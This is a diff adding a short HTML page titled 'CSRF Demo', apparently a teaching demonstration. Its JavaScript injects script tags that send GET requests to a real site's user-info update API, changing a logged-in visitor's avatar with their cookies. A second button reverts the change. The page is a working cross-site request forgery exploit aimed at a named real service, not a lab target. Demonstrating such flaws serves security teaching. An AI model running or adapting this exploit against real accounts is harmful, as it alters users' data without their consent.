@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>CSRF Demo</title>
+</head>
+
+<body>
+    <div>
+        1.先打开网站看看 <a href="https://www.shiguangkey.com" target="_blank">shiguangkey.com</a>
+    </div>
+
+    <div>
+        2.<button id="change-avatar">再点我</button>
+    </div>
+
+    <div class="goback" style="display:none">
+        3.<a href="https://www.shiguangkey.com/i/profile" target="_blank">回去看看</a>
+    </div>
+
+    <div class="goback" style="display:none">
+        4.<button id="reset-avatar">干了坏事要恢复现场</button>
+    </div>
+
+    <div id="re-check" style="display:none">
+        5.<a href="https://www.shiguangkey.com/i/profile" target="_blank">验证下</a>
+    </div>
+
+    <script>
+        document.getElementById('change-avatar').addEventListener('click', () => {
+            var s = document.createElement('script');
+            s.src = 'https://auth2.shiguangkey.com/api/update/userInfo?headImg=file%2F201809%2F25%2F20180925112956060189715.jpg';
+            s.onload = () => {
+                [...document.querySelectorAll('.goback')].forEach(el => {
+                    el.style.display = 'block'
+                })
+            };
+            document.body.appendChild(s);
+        });
+        document.getElementById('reset-avatar').addEventListener('click', () => {
+            var s = document.createElement('script');
+            s.src = 'https://auth2.shiguangkey.com/api/update/userInfo?headImg=file%2F201805%2F14%2F20180514175718141645761.jpg';
+            s.onload = () => {
+                alert('报告，屁股已经擦干净');
+                document.getElementById('re-check').style.display = 'block'
+            }
+            document.body.appendChild(s);
+        });
+    </script>
+</body>
+
+</html>
